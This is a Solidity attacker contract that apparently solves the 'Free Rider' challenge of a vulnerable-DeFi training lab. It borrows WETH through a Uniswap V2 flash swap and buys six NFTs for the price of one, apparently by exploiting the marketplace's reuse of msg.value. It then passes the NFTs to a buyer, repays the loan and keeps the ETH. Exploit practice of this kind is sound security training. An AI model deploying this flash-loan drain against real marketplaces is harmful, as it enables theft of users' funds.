// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "hardhat/console.sol";

interface INftMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function withdraw(uint256 wad) external;

    function deposit() external payable;
}

contract FreeRiderAttacker is IERC721Receiver {
    using Address for address;

    address pool_pair;
    address weth;
    address dvtToken;
    address dvtNft;
    address target;
    address buyer;
    uint256 fee;
    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _pool_pair,
        address _weth,
        address _dvtToken,
        address _dvtNft,
        address _target,
        address _buyer,
        uint256 _fee
    ) {
        pool_pair = _pool_pair;
        weth = _weth;
        dvtToken = _dvtToken;
        dvtNft = _dvtNft;
        target = _target;
        buyer = _buyer;
        fee = _fee;
    }

    function getLoan() public {
        // Ask for loan
        // console.log("CONTRACT::: Called for loan! Taking out Fee of:", fee);
        ERC20(weth).transferFrom(msg.sender, address(this), fee);
        IUniswapV2Pair(pool_pair).swap(90 ether, 0, address(this), "hello");
        // console.log("CONTRACT::: Repaid!");
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata data
    ) external payable {
        // console.log("CONTRACT::: Loan Given! Handling now...");
        // console.log("CONTRACT::: Loan Value:", amount0 / 10**18);
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        assert(msg.sender == pool_pair);
        // Unwrap the WETH
        uint256 wethbal = ERC20(weth).balanceOf(address(this));
        IWETH(weth).withdraw(wethbal);
        // console.log(
        //     "CONTRACT::: Current balance: ",
        //     address(this).balance / 10**18
        // );
        // Buy up from market
        INftMarket(target).buyMany{value: 15 ether}(tokenIds);
        // console.log(
        //     "CONTRACT::: BOUGHT NFT! Current balance: ",
        //     address(this).balance / 10**18
        // );
        //  Send NFTS to Buyer
        for (uint256 i = 0; i < 6; i++) {
            ERC721(dvtNft).safeTransferFrom(address(this), buyer, i, "");
        }
        // Repay
        IWETH(weth).deposit{value: amount0 + fee}();
        ERC20(token0).transfer(msg.sender, amount0 + fee);
        // console.log("CONTRACT::: Tried repaying, Going back to uniswap!");
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external view override returns (bytes4) {
        // console.log("CONTRACT::: Received NFT! ID:", _tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {
        // console.log("CONTRACT::: Received ETH from : ", msg.sender);
    }
}
